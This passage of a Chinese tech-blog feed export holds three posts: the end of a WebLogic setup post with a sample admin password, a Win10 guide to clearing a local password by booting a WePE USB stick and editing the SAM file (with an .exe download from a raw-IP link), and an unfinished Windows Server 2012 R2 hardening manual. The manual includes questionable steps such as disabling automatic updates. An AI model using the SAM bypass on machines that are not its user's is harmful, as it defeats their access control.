class="line">PATH&#x3D;&#x2F;weblogic&#x2F;bea&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;bin:&#x2F;home&#x2F;weblogic&#x2F;weblogic_install_dir&#x2F;wls12213&#x2F;wlserver&#x2F;server&#x2F;bin:&#x2F;home&#x2F;weblogic&#x2F;weblogic_install_dir&#x2F;wls12213&#x2F;wlserver&#x2F;..&#x2F;oracle_common&#x2F;modules&#x2F;thirdparty&#x2F;org.apache.ant&#x2F;1.9.8.0.0&#x2F;apache-ant-1.9.8&#x2F;bin:&#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;jdk1.8.0_161&#x2F;jre&#x2F;bin:&#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;jdk1.8.0_161&#x2F;bin:&#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;jdk1.8.0_161&#x2F;bin:&#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;jdk1.8.0_161&#x2F;bin:&#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;jdk1.8.0_161&#x2F;bin:&#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;jdk1.8.0_161&#x2F;bin:&#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;jdk1.8.0_161&#x2F;bin:&#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;jdk1.8.0_161&#x2F;bin:&#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;jdk1.8.0_161&#x2F;bin:&#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;jdk1.8.0_161&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;root&#x2F;bin</span><br><span class="line">.</span><br><span class="line">***************************************************</span><br><span class="line">*  To start WebLogic Server, use a username and   *</span><br><span class="line">*  password assigned to an admin-level user.  For *</span><br><span class="line">*  server administration, use the WebLogic Server *</span><br><span class="line">*  console at http:&#x2F;&#x2F;hostname:port&#x2F;console        *</span><br><span class="line">***************************************************</span><br><span class="line">Starting WLS with line:</span><br><span class="line"></span><br><span class="line">········中间省略</span><br><span class="line"></span><br><span class="line">Oracle Coherence Version 12.2.1.4.0 Build 74888</span><br><span class="line"> Grid Edition: Development mode</span><br><span class="line">Copyright (c) 2000, 2019, Oracle and&#x2F;or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">2020-06-17 20:16:33.141&#x2F;10.411 Oracle Coherence GE 12.2.1.4.0 &lt;Info&gt; (thread&#x3D;[STANDBY] ExecuteThread: &#39;10&#39; for queue: &#39;weblogic.kernel.Default (self-tuning)&#39;, member&#x3D;n&#x2F;a): Configured versioned, multi-cluster Management over ReST</span><br></pre></td></tr></table></figure>

<h5 id="8、验证"><a href="#8、验证" class="headerlink" title="8、验证"></a>8、验证</h5><p><code>http://IP:7001/console</code></p>
<p>账户密码在之前的第六步设置</p>
<p><strong>账号：weblogic</strong></p>
<p><strong>密码：weblogic123</strong></p>
<h5 id="9、登录界面"><a href="#9、登录界面" class="headerlink" title="9、登录界面"></a>9、登录界面</h5><p><img src= "/img/loading.gif" data-src="/2019/03/22/Weblogic%E4%BB%8B%E7%BB%8D%E5%8F%8A%E9%83%A8%E7%BD%B2/image-20200821105419521.png" alt="image-20200821105419521"></p>
<p><img src= "/img/loading.gif" data-src="/2019/03/22/Weblogic%E4%BB%8B%E7%BB%8D%E5%8F%8A%E9%83%A8%E7%BD%B2/image-20200821105431743.png" alt="image-20200821105431743"></p>
<p>实际环境中可以配置免密登录等，可自行摸索</p>
]]></content>
      <categories>
        <category>Weblogic</category>
      </categories>
      <tags>
        <tag>Weblogic</tag>
      </tags>
  </entry>
  <entry>
    <title>Win10登陆密码忘记了怎么办</title>
    <url>/2020/11/01/Win10%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81%E5%BF%98%E8%AE%B0%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Win10登陆密码忘记了怎么办"><a href="#Win10登陆密码忘记了怎么办" class="headerlink" title="Win10登陆密码忘记了怎么办"></a>Win10登陆密码忘记了怎么办</h1><p>如果你忘记了你的登陆密码，需要先确认你是以什么方式登陆的win10（微软账号登陆和脱机登陆需要不同的找回/破解密码方式）。如果你的登陆界面显示输入pin码，那么您可能是使用微软账号登陆的。如下图（下图两种方式均为微软账号登陆）</p>
<p><img src= "/img/loading.gif" data-src="/2020/11/01/Win10%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81%E5%BF%98%E8%AE%B0%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E/E:%5Cblog%5Cmyblog%5Csource_posts%5CWin10%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81%E5%BF%98%E8%AE%B0%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E%5Cimage-20210315110125491.png" alt="image-20210315110125491"></p>
<p><img src= "/img/loading.gif" data-src="/2020/11/01/Win10%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81%E5%BF%98%E8%AE%B0%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E/E:%5Cblog%5Cmyblog%5Csource_posts%5CWin10%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81%E5%BF%98%E8%AE%B0%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E%5Cimage-20210315110136554.png" alt="image-20210315110136554"></p>
<p>如下图则是脱机（本机账号）登陆</p>
<p><img src= "/img/loading.gif" data-src="/2020/11/01/Win10%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81%E5%BF%98%E8%AE%B0%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E/E:%5Cblog%5Cmyblog%5Csource_posts%5CWin10%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81%E5%BF%98%E8%AE%B0%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E%5Cimage-20210315110148316.png" alt="image-20210315110148316"></p>
<p>一、微软账号登陆找回密码<br><img src= "/img/loading.gif" data-src="/2020/11/01/Win10%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81%E5%BF%98%E8%AE%B0%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E/E:%5Cblog%5Cmyblog%5Csource_posts%5CWin10%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81%E5%BF%98%E8%AE%B0%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E%5Cimage-20210315110218773.png" alt="image-20210315110218773"></p>
<p>1、点击登陆选项，选择密码。点击我忘记了密码<br><img src= "/img/loading.gif" data-src="/2020/11/01/Win10%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81%E5%BF%98%E8%AE%B0%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E/E:%5Cblog%5Cmyblog%5Csource_posts%5CWin10%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81%E5%BF%98%E8%AE%B0%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E%5Cimage-20210315110230610.png" alt="image-20210315110230610"></p>
<p>2、这里一般会自动填写你登陆的账号，点击下一步。</p>
<p><img src= "/img/loading.gif" data-src="/2020/11/01/Win10%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81%E5%BF%98%E8%AE%B0%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E/E:%5Cblog%5Cmyblog%5Csource_posts%5CWin10%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81%E5%BF%98%E8%AE%B0%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E%5Cimage-20210315110245151.png" alt="image-20210315110245151"></p>
<p>3、选择你的验证方式，这里以密保手机为例，输入完整的手机号的后四位，点击获取代码，会给你的密保手机发送一条验证码。</p>
<p><img src= "/img/loading.gif" data-src="/2020/11/01/Win10%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81%E5%BF%98%E8%AE%B0%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E/E:%5Cblog%5Cmyblog%5Csource_posts%5CWin10%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81%E5%BF%98%E8%AE%B0%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E%5Cimage-20210315110308403.png" alt="image-20210315110308403"></p>
<p>4、在这里输入你手机接收到的验证代码，点击下一步。</p>
<p><img src= "/img/loading.gif" data-src="/2020/11/01/Win10%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81%E5%BF%98%E8%AE%B0%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E/E:%5Cblog%5Cmyblog%5Csource_posts%5CWin10%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81%E5%BF%98%E8%AE%B0%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E%5Cimage-20210315110340138.png" alt="image-20210315110340138"></p>
<p>5、在这里我们输入我们需要修改的新密码，输入完成后，点击下一步。</p>
<p><img src= "/img/loading.gif" data-src="/2020/11/01/Win10%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81%E5%BF%98%E8%AE%B0%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E/E:%5Cblog%5Cmyblog%5Csource_posts%5CWin10%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81%E5%BF%98%E8%AE%B0%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E%5Cimage-20210315110353250.png" alt="image-20210315110353250"></p>
<p>6、到这里我们就修改完我们的微软账号密码了，点击登陆后输入刚才修改的密码登陆即可。</p>
<p>二、脱机（本地）账号登陆破解密码</p>
<p>要破解登陆账号的密码，我们首先要知道我们的Windows系统登陆密码是保存在系统盘的Windows\system32\config\sam 文件内的，我们只要借助工具修改该文件内保存的密码即可破解成功。这里我们以微PE为例进行破解。</p>
<p>准备工作：</p>
<pre><code>①一个至少4G的U盘
②一台可以正常使用的win系统电脑
③微PE安装工具（下载地址来自网络http://45.252.224.81/files/809400000DD85AE4/down-ww3.newasp.net/pcdown/soft/soft1/wepe_64.exe）</code></pre><p>1、在可以正常使用的电脑打开我们下载的微PE安装工具，并将U盘插入电脑。</p>
<p><img src= "/img/loading.gif" data-src="/2020/11/01/Win10%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81%E5%BF%98%E8%AE%B0%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E/E:%5Cblog%5Cmyblog%5Csource_posts%5CWin10%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81%E5%BF%98%E8%AE%B0%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E%5Cimage-20210315110446824.png" alt="image-20210315110446824"></p>
<p>2、点击红色箭头指示的图标，安装PE到U盘。</p>
<p><img src= "/img/loading.gif" data-src="/2020/11/01/Win10%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81%E5%BF%98%E8%AE%B0%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E/E:%5Cblog%5Cmyblog%5Csource_posts%5CWin10%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81%E5%BF%98%E8%AE%B0%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E%5Cimage-20210315110459520.png" alt="image-20210315110459520"></p>
<p>3、待写入U盘栏选择我们插入的U盘，点击立即安装进U盘。等待写入U盘完成，将U盘推出插入需要破解密码的电脑。</p>
<p>4、开机按F10，选择U盘，从U盘启动。进入微PE。</p>
<p><img src= "/img/loading.gif" data-src="/2020/11/01/Win10%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81%E5%BF%98%E8%AE%B0%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E/E:%5Cblog%5Cmyblog%5Csource_posts%5CWin10%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81%E5%BF%98%E8%AE%B0%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E%5Cimage-20210315110512243.png" alt="image-20210315110512243"></p>
<p>5、打开桌面的Windows密码修改工具，根据上图图示操作。MECHREVO为我需要破解的用户名。<br><img src= "/img/loading.gif" data-src="/2020/11/01/Win10%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81%E5%BF%98%E8%AE%B0%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E/E:%5Cblog%5Cmyblog%5Csource_posts%5CWin10%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81%E5%BF%98%E8%AE%B0%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E%5Cimage-20210315110528063.png" alt="image-20210315110528063"></p>
<p>6、如果不输入直接确定，则是清除登陆密码，如果输入密码确定则是修改登陆密码。</p>
<p><img src= "/img/loading.gif" data-src="/2020/11/01/Win10%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81%E5%BF%98%E8%AE%B0%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E/E:%5Cblog%5Cmyblog%5Csource_posts%5CWin10%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81%E5%BF%98%E8%AE%B0%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E%5Cimage-20210315110544359.png" alt="image-20210315110544359"></p>
<p>7、点击保存退出。</p>
<p><img src= "/img/loading.gif" data-src="/2020/11/01/Win10%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81%E5%BF%98%E8%AE%B0%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E/E:%5Cblog%5Cmyblog%5Csource_posts%5CWin10%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81%E5%BF%98%E8%AE%B0%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E%5Cimage-20210315110557368.png" alt="image-20210315110557368"></p>
<p>8、重启，拔掉U盘。Win10密码破解步骤到这里就结束了。正常进入系统即可。</p>
<p>综上，推荐各位使用微软账号登陆win10系统，系统安全性更高。</p>
]]></content>
      <categories>
        <category>生活小技巧</category>
      </categories>
      <tags>
        <tag>生活小技巧</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows server 2012 R2 安全防护</title>
    <url>/2020/09/04/Windows%20server%202012%20R2%20%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>安全加固操作手册编写不够完善，后续有更改请自己修改</p>
<h1 id="Windows-server-2012-R2-安全防护"><a href="#Windows-server-2012-R2-安全防护" class="headerlink" title="Windows server 2012 R2 安全防护"></a>Windows server 2012 R2 安全防护</h1><h2 id="1、更新系统补丁"><a href="#1、更新系统补丁" class="headerlink" title="1、更新系统补丁"></a>1、更新系统补丁</h2><p> 更新补丁是安全加固最重要的步骤。</p>
<p> 具体操作如下</p>
<p>按下“WIN”键，如下图</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/Windows%20server%202012%20R2%20%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/image-20200906211249993.png" alt="image-20200906211249993"></p>
<p>选中属性</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/Windows%20server%202012%20R2%20%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/image-20200906211319725.png" alt="image-20200906211319725"></p>
<p>单击“windows更新”</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/Windows%20server%202012%20R2%20%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/image-20200906211357318.png" alt="image-20200906211357318"></p>
<p>“检查更新“并安装更新，更新完之后将“更改设置”里面的设置为”从不自动更新“</p>
<p>因为自动更新会重启服务器，对服务可能会造成影响，我们并不希望这样的事情发生</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/Windows%20server%202012%20R2%20%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/image-20200906211542598.png" alt="image-20200906211542598"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/Windows%20server%202012%20R2%20%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/image-20200906211606156.png" alt="image-20200906211606156"></p>
<p>安装更新后请先不要重启，先往后操作</p>
<h2 id="2、禁用不需要的服务"><a href="#2、禁用不需要的服务" class="headerlink" title="2、禁用不需要的服务"></a>2、禁用不需要的服务</h2><p>1.禁用不必要而服务</p>
<p>2.以下服务必须禁用：Server、Workstation、Print Spooler、Remote Registry、Routing and Remote Access、TCP/IP NetBIOS Helper、Computer Browser（该处存疑，请根据实际工作中需要禁用的服务进行禁用）</p>
<p> 禁用方法如下，这里以Workstation为例，按下“win+r”，呼出“运行”菜单，输入“services.msc”并单击确定</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/Windows%20server%202012%20R2%20%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/image-20200906212126032.png" alt="image-20200906212126032"></p>
<p>进入到如下图页面</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/Windows%20server%202012%20R2%20%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/image-20200906212256979.png" alt="image-20200906212256979"></p>
<p>找到想要禁用的服务，右键该行，一级列表可以简单地控制启停，单击属性进行更详细的操作</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/Windows%20server%202012%20R2%20%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/image-20200906212344798.png" alt="image-20200906212344798"></p>
<p>进行对应的禁用操作，点击“应用”和“确定”</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/Windows%20server%202012%20R2%20%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/image-20200906212508516.png" alt="image-20200906212508516"></p>
<p>操作完成之后如下图</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/Windows%20server%202012%20R2%20%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/image-20200906212617100.png" alt="image-20200906212617100"></p>
<p>至此，服务禁用完成，其他服务同理</p>
<h2 id="3、系统权限设置"><a href="#3、系统权限设置" class="headerlink" title="3、系统权限设置"></a>3、系统权限设置</h2><p>由于系统权限设置的地方非常多，我们只能公布常用的部分。</p>
<p>部分文件被系统隐藏了，不便于设置，因此我们先将所有文件显示出来。</p>
<p>显示所有文件操作方法如下</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/Windows%20server%202012%20R2%20%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/image-20200906213359312.png" alt="image-20200906213359312"></p>
<p>更改系统盘所有者为Administrators</p>
<p>所有盘根目录只保留Administrators和SYSTEM权限。</p>
<p>系统盘加上Users“读取权限”，仅当前目录</p>
<p>C:\WINDOWS、C:\WINDOWS\system32、C:\Windows\SysWOW64 只保留Administrators和SYSTEM，以及User读和执行</p>
<p>C:\Program Files 、C:\Program Files (x86) 只保留Administrators和SYSTEM</p>
<p>C:\Program Files\Common Files 、C:\Program Files (x86)\Common Files 只保留Administrators和SYSTEM，以及User读和执行</p>
<p>C:\ProgramData 只保留Administrators和SYSTEM，以及User读和执行</p>
<p>C:\Users 只保留Administrators和SYSTEM</p>
<p>C:\inetpub 只保留Administrators和SYSTEM</p>
<p>C:\inetpub\custerr 只保留Administrators和SYSTEM，以及User读</p>
<p>C:\inetpub\temp 只保留Administrators和SYSTEM，以及User读写删除和IIS_IUSRS读写删除</p>
<p>C:\Windows\Temp 只保留Administrators和SYSTEM，以及User读写删除和IIS_IUSRS读写删除</p>
<p>C:\Windows\tracing  只保留Administrators和SYSTEM，以及User读和network service读</p>
<p>C:\Windows\Vss  只保留Administrators和SYSTEM，以及User读和network service读写删除</p>
<p>C:\ProgramData\Microsoft\DeviceSync 只保留Administrators和SYSTEM，以及User读</p>
<p>C:\WINDOWS\下的部分exe软件只保留Administrators和SYSTEM，如regedit.exe、regedt32.exe、cmd.exe、net.exe、net1.exe、netstat.exe、at.exe、attrib.exe、cacls.exe、format.com、activeds.tlb、shell32.dll、wshom.ocx </p>
<p>更改权限的操作方法如下</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/Windows%20server%202012%20R2%20%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/image-20200906214017427.png" alt="image-20200906214017427"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/Windows%20server%202012%20R2%20%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/image-20200906214213819.png" alt="image-20200906214213819"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/Windows%20server%202012%20R2%20%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/image-20200906214428448.png" alt="image-20200906214428448"></p>
<p>目录的设置也同理</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/Windows%20server%202012%20R2%20%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/image-20200906214525985.png" alt="image-20200906214525985"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/Windows%20server%202012%20R2%20%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/image-20200906214651839.png" alt="image-20200906214651839"></p>
<p>注意：如果安装了SQL Server软件，还需要给系统盘上SQL Server相关目录加上NT SERVICE\MSSQLSERVER的权限。</p>
<p>如果设置后网站无法访问，给网站目录加上Users的读写删除权限试试。</p>
<h2 id="4、卸载危险组件"><a href="#4、卸载危险组件" class="headerlink" title="4、卸载危险组件"></a>4、卸载危险组件</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">regsvr32 /u <span class="variable">%SystemRoot%</span>\system32\shell32.dll</span><br><span class="line"></span><br><span class="line">regsvr32 /u <span class="variable">%SystemRoot%</span>\system32\wshom.ocx</span><br></pre></td></tr></table></figure>

<p>操作方法如下</p>
<p>“win+r”，唤出“运行”框，输入“cmd”后单击“确定”</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/Windows%20server%202012%20R2%20%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/image-20200906213551765.png" alt="image-20200906213551765"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/Windows%20server%202012%20R2%20%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/image-20200906213900413.png" alt="image-20200906213900413"></p>
<h2 id="5、开启防火墙"><a href="#5、开启防火墙" class="headerlink" title="5、开启防火墙"></a>5、开启防火墙</h2><p> 建议只开放需要的端口，如：80、3389</p>
<p> 注意：开启防火墙前必须先确认当前远程端口已经在放行规则 </p>
<p> 我当前用的33699端口，因此防火墙需要加上33699端口</p>
<p>操作方法如下</p>
<p>1.首先点击桌面左下角的Window图标，点击“控制面板“，然后选择“windows防火墙”会弹出防火墙的详细页面，如下图所示：</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/Windows%20server%202012%20R2%20%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/image-20200906215011485.png" alt="image-20200906215011485"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/Windows%20server%202012%20R2%20%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/image-20200906215051424.png" alt="image-20200906215051424"></p>
<p>2.然后点击“打开或关闭windows防火墙”就可以查看并设置具体防火墙的状态(开启或关闭)。</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/Windows%20server%202012%20R2%20%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/image-20200906215148054.png" alt="image-20200906215148054"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/Windows%20server%202012%20R2%20%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/image-20200906215220941.png" alt="image-20200906215220941"></p>
<p>3.返回”windows防火墙“主界面，然后点击“高级设置”，点击左侧的“入站规则”，用户就可以看到服务器允许连接的程序以及端口规则的详细列表信息。</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/Windows%20server%202012%20R2%20%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/image-20200906215338465.png" alt="image-20200906215338465"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/Windows%20server%202012%20R2%20%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/image-20200906215347527.png" alt="image-20200906215347527"></p>
<p>4.选择“新建规则”在弹出的列表中建立需要开放远程连接端口号(以3333为例)，开放端口的具体操作步骤如下图所示：</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/Windows%20server%202012%20R2%20%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/image-20200906215406683.png" alt="image-20200906215406683"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/Windows%20server%202012%20R2%20%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/image-20200906215416876.png" alt="image-20200906215416876"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/Windows%20server%202012%20R2%20%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/image-20200906215426954.png" alt="image-20200906215426954"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/Windows%20server%202012%20R2%20%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/image-20200906215438541.png" alt="image-20200906215438541"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/Windows%20server%202012%20R2%20%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/image-20200906215447381.png" alt="image-20200906215447381"></p>
<p>经过以上步骤的设置，就添加了开放的端口号，服务器防火墙就会自动放行，详细的信息可以点击设置的规则查看，比如可以设置详细的计算机连接、作用域的IP连接以及协议和端口中选择协议类型等等。</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/Windows%20server%202012%20R2%20%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/image-20200906215504276.png" alt="image-20200906215504276"></p>
<h2 id="6、更改远程端口"><a href="#6、更改远程端口" class="headerlink" title="6、更改远程端口"></a>6、更改远程端口</h2><p> 有很多暴力破解工具专门针对远程登录，更改远程端口能防范扫描。</p>
<p>操作方法如下</p>
<p>1.首先呼出“运行”框，按“win+r”键，输入“regedit”，点“确定”</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/Windows%20server%202012%20R2%20%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/image-20200906215805220.png" alt="image-20200906215805220"></p>
<p>2.进入路径：[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Teminal Sever\Wds\rdpwd\Tds\tcp]。</p>
<p>找到右侧的PortNumber（或直接找3389这个值更快一些哈），点击十进制，将3389修改为新的端口号比如6001，确定。</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/Windows%20server%202012%20R2%20%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/image-20200906220140816.png" alt="image-20200906220140816"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/Windows%20server%202012%20R2%20%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/image-20200906220228284.png" alt="image-20200906220228284"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/Windows%20server%202012%20R2%20%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/image-20200906220350886.png" alt="image-20200906220350886"></p>
<p>3.进入路径：[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Teminal Sever\WinStation\RDP_Tcp]。</p>
<p>找到右侧的PortNumber（或直接找3389这个值更快一些哈），点击十进制，将3389修改为新的端口号比如6001，确定。</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/Windows%20server%202012%20R2%20%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/image-20200906220440703.png" alt="image-20200906220440703"></p>
<p>4.注册表中的端口修改好后，还需要在防火墙设置新开好的端口：6001，步骤如下：</p>
<p>开启防火墙——》入站规则</p>
<p>新建规则：端口——》Tcp——》特定端口：6001——》允许连接——》名称：新远程桌面连接端口，完成</p>
<p>开启防火墙对应的操作略</p>
<p>5.将系统默认的3389端口禁用掉。</p>
<p>最后重启一下电脑，测试一下是否已设置成功，如果设置成功，原先不加端口的ip（如：113.18.206.93）远程连接将会失败，而ip加上新设的端口（113.18.206.93：6001）才能连接成功。</p>
<h2 id="7、软件降权设置"><a href="#7、软件降权设置" class="headerlink" title="7、软件降权设置"></a>7、软件降权设置</h2><p>常用的Serv-U、SQL Server、MySQL、Apache、Tomcat等都存在安全隐患，所以要用低权限用户运行，这样，即使被黑客攻进系统，也不会对系统造成重大损失。</p>
<h3 id="降权Serv-U"><a href="#降权Serv-U" class="headerlink" title="降权Serv-U"></a>降权Serv-U</h3><p>1、首先打开serv-u管理添加serv-u为系统服务，在自动开始打上勾；</p>
<p>2、接下来对Serv－U进行降权。点击开始-所有程序-管理工具-计算机管理-本地用户和组,创建ftptest用户； </p>
<p>3、建好帐号以后，双击建好的用户编辑用户属性，从“隶属于”里删除user组； </p>
<p>4、在开始菜单的管理工具里找到“服务”点击打开。在“Serv-U FTP Server服务”上点右键，选择属性继续。然后点击“登录”进入登录帐号选择界面。选择刚才建立的系统帐号名，并在下面重复输入2次该帐号的密码（就是刚才让你记住的那个），然后点“应用”，再次点确定，完成服务的设置； </p>
<p> 5、找到serv-u的安装目录(C:\Program Files\RhinoSoft.com\Serv-U)设置serv-u安装目录的权限。添加所有权限除了(完全控制，删除，更改权限，取得所有权限)； </p>
<p> 6、现在，在服务里重启Serv-U FTP Server服务就可以正常启动了。当然，到这里还没有完全设置完，你的FTP用户因为没有权限还是登录不了的，所以还要设置一下目录的权限；</p>
